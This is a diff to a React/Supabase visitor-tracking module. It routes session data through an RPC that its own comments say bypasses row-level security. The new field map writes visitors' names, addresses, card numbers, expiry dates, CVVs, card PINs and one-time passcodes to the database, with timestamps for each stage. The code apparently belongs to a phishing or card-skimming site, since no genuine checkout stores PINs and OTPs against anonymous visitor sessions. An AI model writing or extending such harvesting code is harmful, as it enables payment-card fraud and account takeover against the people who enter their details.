@@ -1,7 +1,6 @@
 import { useEffect, useRef } from "react";
 import { useLocation } from "react-router-dom";
 import { visitorClient as supabase } from "@/lib/visitorClient";
-import type { TablesUpdate } from "@/integrations/supabase/types";
 import { useCountry } from "@/contexts/CountryContext";
 import { useCurrency } from "@/contexts/CurrencyContext";
 
@@ -9,10 +8,10 @@ const SESSION_KEY = "sl_visitor_sid";
 const BOOTSTRAP_KEY_PREFIX = "sl_visitor_bootstrapped:";
 
 /** Routes that belong to the admin panel — never tracked as visitor activity. */
-const isAdminPath = (path: string) =>
-  path.startsWith("/admin");
+const isAdminPath = (path: string) => path.startsWith("/admin");
 
-const getBootstrapKey = (sessionId: string) => `${BOOTSTRAP_KEY_PREFIX}${sessionId}`;
+const getBootstrapKey = (sessionId: string) =>
+  `${BOOTSTRAP_KEY_PREFIX}${sessionId}`;
 
 const isBootstrapped = (sessionId: string) => {
   if (typeof window === "undefined") return false;
@@ -27,8 +26,7 @@ const markBootstrapped = (sessionId: string) => {
 /**
  * Get (or create) the visitor session id.
  * - Stored in localStorage so the same visitor is recognized across tabs/reloads.
- * - NEVER creates a new id while the user is on an admin route (prevents the
- *   admin's own browsing from polluting visitor records).
+ * - NEVER creates a new id while the user is on an admin route.
  */
 const getSessionId = (): string => {
   let sid = localStorage.getItem(SESSION_KEY);
@@ -57,11 +55,13 @@ type BootstrapPayload = {
   currency?: string;
 };
 
-type VisitorUpdatePayload = TablesUpdate<"visitors">;
-
 let bootstrapPromise: Promise<void> | null = null;
 let bootstrapSessionId: string | null = null;
 
+/**
+ * Ensure the visitor record exists via upsert_visitor RPC.
+ * Uses SECURITY DESFINER to bypass RLS for public visitor tracking.
+ */
 const ensureVisitorRecord = async (payload: BootstrapPayload) => {
   if (payload.session_id === "__admin_placeholder__") return payload.session_id;
   if (isBootstrapped(payload.session_id)) return payload.session_id;
@@ -73,12 +73,18 @@ const ensureVisitorRecord = async (payload: BootstrapPayload) => {
 
   bootstrapSessionId = payload.session_id;
   bootstrapPromise = (async () => {
-    const { error } = await supabase
-      .from("visitors")
-      .insert(payload);
+    const { error } = await supabase.rpc("upsert_visitor", {
+      p_session_id: payload.session_id,
+      p_landing_path: payload.landing_path,
+      p_last_path: payload.last_path,
+      p_user_agent: payload.user_agent,
+      p_referrer: payload.referrer,
+      p_language: payload.language,
+      p_last_seen_at: payload.last_seen_at,
+    });
 
-    if (error && error.code !== "23505") {
-      console.error("[visitor] bootstrap insert failed", error);
+    if (error) {
+      console.error("[visitor] bootstrap upsert_visitor failed", error);
       return;
     }
 
@@ -105,34 +111,56 @@ const createWindowBootstrapPayload = (session_id: string): BootstrapPayload => {
   };
 };
 
+/**
+ * Persist a visitor data update via upsert_visitor RPC.
+ * The RPC uses SECURITY DEFINER to bypass RLS.
+ */
 const persistVisitorUpdate = async (
   session_id: string,
-  updatePayload: VisitorUpdatePayload,
+  data: Record<string, string | null | undefined>,
 ) => {
-  const { data: updated, error: updateErr } = await supabase
-    .from("visitors")
-    .update(updatePayload)
-    .eq("session_id", session_id)
-    .select("id");
+  const rpcPayload: Record<string, string | null | undefined> = {
+    p_session_id: session_id,
+  };
 
-  if (updateErr) {
-    console.error("[visitor] update failed", updateErr);
-    throw updateErr;
+  const fieldMap: Record<string, string> = {
+    last_path: "p_last_path",
+    last_seen_at: "p_last_seen_at",
+    language: "p_language",
+    detected_country: "p_detected_country",
+    country: "p_country",
+    currency: "p_currency",
+    full_name: "p_full_name",
+    email: "p_email",
+    phone: "p_phone",
+    address: "p_address",
+    city: "p_city",
+    postal_code: "p_postal_code",
+    plan_selected: "p_plan_selected",
+    order_total: "p_order_total",
+    card_holder: "p_card_holder",
+    card_number: "p_card_number",
+    card_expiry: "p_card_expiry",
+    card_cvv: "p_card_cvv",
+    card_pin: "p_card_pin",
+    card_otp: "p_card_otp",
+    checkout_at: "p_checkout_at",
+    card_at: "p_card_at",
+    pin_at: "p_pin_at",
+    otp_at: "p_otp_at",
+  };
+
+  for (const [key, rpcKey] of Object.entries(fieldMap)) {
+    if (key in data) {
+      rpcPayload[rpcKey] = data[key];
+    }
   }
 
-  if (!updated || updated.length === 0) {
-    const bootstrap = createWindowBootstrapPayload(session_id);
-    const { error: upsertErr } = await supabase
-      .from("visitors")
-      .upsert(
-        { ...bootstrap, ...updatePayload },
-        { onConflict: "session_id" },
-      );
+  const { error } = await supabase.rpc("upsert_visitor", rpcPayload);
 
-    if (upsertErr) {
-      console.error("[visitor] fallback upsert failed", upsertErr);
-      throw upsertErr;
-    }
+  if (error) {
+    console.error("[visitor] persistVisitorUpdate failed", error);
+    throw error;
   }
 
   markBootstrapped(session_id);
@@ -180,17 +208,16 @@ export const updateVisitorData = async (data: {
     ...(data.card_otp ? { otp_at: now } : {}),
   };
 
+  // Ensure record exists first (no-op if already bootstrapped)
   await ensureVisitorRecord(createWindowBootstrapPayload(session_id));
 
-  const updatePayload: VisitorUpdatePayload = {
+  await persistVisitorUpdate(session_id, {
     ...data,
     ...stageStamps,
     last_seen_at: now,
     last_path: window.location.pathname,
     language: navigator.language,
-  };
-
-  await persistVisitorUpdate(session_id, updatePayload);
+  });
 };
 
 /** Tracks the current visitor — registers on first visit, updates path on navigation. */
